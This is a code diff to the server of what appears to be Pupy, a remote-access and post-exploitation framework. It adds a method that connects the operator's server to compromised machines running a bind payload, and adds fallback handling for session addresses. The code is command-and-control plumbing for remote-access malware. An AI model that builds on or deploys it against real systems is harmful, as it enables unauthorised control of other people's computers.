@@ -28,6 +28,10 @@ from network.conf import transports
 from pupylib.utils.rpyc_utils import obtain
 from .PupyTriggers import on_connect
 from network.utils import parse_transports_args
+from network.base_launcher import LauncherError
+import network.conf
+import rpyc
+import shlex
 
 try:
 	import ConfigParser as configparser
@@ -182,7 +186,11 @@ class PupyServer(threading.Thread):
 			if self.handler:
 				addr = conn.modules['pupy'].get_connect_back_host()
 				server_ip, server_port = addr.rsplit(':', 1)
-				client_ip, client_port = conn._conn._config['connid'].split(':')
+				try:
+					client_ip, client_port = conn._conn._config['connid'].split(':')
+				except:
+					client_ip, client_port = "0.0.0.0", 0 # TODO for bind payloads
+					
 				self.handler.display_srvinfo("Session {} opened ({}:{} <- {}:{})".format(self.current_id, server_ip, server_port, client_ip, client_port))
 			self.current_id += 1
 		if pc:
@@ -303,7 +311,21 @@ class PupyServer(threading.Thread):
 		if job_id not in self.jobs:
 			raise PupyModuleError("%s: no such job !"%job_id)
 		return self.jobs[job_id]
-		
+
+	def connect_on_client(self, launcher_args):
+		""" connect on a client that would be running a bind payload """
+		launcher=network.conf.launchers["connect"]()
+		try:
+			launcher.parse_args(shlex.split(launcher_args))
+		except LauncherError as e:
+			launcher.arg_parser.print_usage()
+			return
+		stream=launcher.iterate().next()
+		conn=rpyc.utils.factory.connect_stream(stream, PupyService.PupyBindService, {})
+		bgsrv=rpyc.BgServingThread(conn)
+		bgsrv.SLEEP_INTERVAL=0.01 # consume ressources but faster response ...
+ 		
+
 	def run(self):
 		self.handler_registered.wait()
 		t=transports[self.transport]
